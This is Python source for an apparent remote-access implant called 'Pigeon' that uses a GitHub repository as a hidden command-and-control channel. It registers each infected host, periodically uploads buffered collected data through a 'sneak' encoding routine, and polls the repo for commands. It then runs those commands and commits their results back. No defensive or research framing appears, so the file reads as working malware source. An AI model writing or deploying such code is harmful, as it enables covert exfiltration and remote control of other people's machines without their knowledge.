from config import PARAM, METHODS, RUNNING
from github import Github, Repository, ContentFile
from json import loads
from key import GIT_API_KEY
from threading import Thread, Lock
from time import sleep, strftime


class Pigeon:
    __buffer: dict[str, str] = {}
    __bufferLock: Lock = Lock()
    __interval: int = 300
    __repo: Repository.Repository
    __uid: str = ""
    __commands: dict[str, list[str] | None] = {}

    @staticmethod
    def pushToBuffer(src: str, con: str) -> None:
        while True:
            if Pigeon.__bufferLock.acquire(blocking=False):
                if Pigeon.__buffer.get(src) == None:
                    Pigeon.__buffer[src] = con
                else:
                    Pigeon.__buffer[src] += con
                break
        Pigeon.__bufferLock.release()

    @staticmethod
    def startService() -> None:
        Thread(target=Pigeon.__deliverContents).start()
        Thread(target=Pigeon.__pullCommands).start()
        Thread(target=Pigeon.__executioner).start()

    @staticmethod
    def stopService() -> None:
        RUNNING.clear()

    @staticmethod
    def initComs(uid: str, info: str) -> None:
        Pigeon.__interval = (
            int(PARAM["interval"]) if PARAM.get("interval") != None else 300
        )
        Pigeon.__repo = Github(GIT_API_KEY).get_repo(PARAM["repo"])
        info = METHODS["sneak"](info)
        Pigeon.__uid = uid
        _, _     = Pigeon.__repo.create_file(
            "{}/00_info".format(uid), "First contact", info
        )
        _, _ = Pigeon.__repo.create_file(
            "{}/00_commands".format(uid), "First contact", "[]"
        )

    @staticmethod
    def __deliverContents() -> None:
        while RUNNING.is_set():
            sleep(Pigeon.__interval)
            if Pigeon.__bufferLock.acquire(blocking=False):
                info = METHODS["sneak"](str(Pigeon.__buffer))
                message: str = strftime("%Y-%m-%d %H:%M")
                _, _ = Pigeon.__repo.create_file(
                    "{}/{}".format(Pigeon.__uid, message),
                    "Update from {}".format(message),
                    info,
                )
                Pigeon.__buffer = {}
                Pigeon.__bufferLock.release()

    @staticmethod
    def __pullCommands() -> None:
        while RUNNING.is_set():
            sleep(Pigeon.__interval)
            fObject = Pigeon.__repo.get_contents("{}/00_commands".format(Pigeon.__uid))
            if type(fObject) != ContentFile.ContentFile:
                continue
            cmdFile = loads(fObject.decoded_content.decode())
            if len(cmdFile) == 0:
                continue
            for commands in cmdFile:
                Pigeon.__commands[list(commands.keys())[0]] = list(*commands.values())
            Pigeon.__repo.update_file("{}/00_commands".format(Pigeon.__uid), "Command recieved", "[]", fObject.sha)

    @staticmethod
    def __executioner() -> None:
        while RUNNING.is_set():
            if len(Pigeon.__commands) == 0:
                sleep(Pigeon.__interval)
                continue
            for cmd, params in Pigeon.__commands.items():
                message: str = strftime("%Y-%m-%d %H:%M")
                if METHODS.get(cmd) == None:
                    Pigeon.__repo.create_file(
                        "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
                        "Executioner failed",
                        METHODS["sneak"]("The {} command is not available or loaded".format(cmd))
                    )
                    continue
                if type(params) == list:
                    result = METHODS[cmd](*params)
                if result is not None and len(result) != 0:
                    Pigeon.__repo.create_file(
                        "{}/00_results/{}_{}".format(Pigeon.__uid, cmd, message),
                        "Executioner push",
                        METHODS["sneak"](result)
                    )
            Pigeon.__commands.clear()
